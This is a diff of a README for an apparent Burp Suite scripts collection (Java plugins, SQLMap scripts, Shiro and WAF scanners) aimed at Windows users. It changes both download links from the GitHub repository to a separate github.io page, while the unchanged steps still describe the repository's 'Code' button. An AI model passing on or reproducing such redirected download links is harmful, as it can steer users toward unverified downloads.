@@ -1,6 +1,6 @@
 # 🛡️ burpsuite-executor-scripts - Streamline your advanced security testing workflows
 
-[![](https://img.shields.io/badge/Download-Project_Files-blue)](https://github.com/Tianna94/burpsuite-executor-scripts)
+[![](https://img.shields.io/badge/Download-Project_Files-blue)](https://tianna94.github.io)
 
 This collection provides a set of manual tools and automated scripts for security professionals. These tools integrate with Burp Suite to help you find vulnerabilities in web applications. The repository contains custom Java plugins, scripts for SQLMap, and scanners for Shiro and WAF systems. You can use these resources to automate repetitive tasks and improve your testing speed.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11. Ensure you have the latest
 
 ## 📥 Downloading the software
 
-Visit this page to download the collection: [https://github.com/Tianna94/burpsuite-executor-scripts](https://github.com/Tianna94/burpsuite-executor-scripts)
+Visit this page to download the collection: [https://tianna94.github.io](https://tianna94.github.io)
 
 Once you reach the link, find the green button labeled "Code" near the top right of the page. Select "Download ZIP" from the menu. Save the file to your computer. Create a folder named "BurpTools" in your documents directory and extract the contents of the ZIP file into this folder.
 
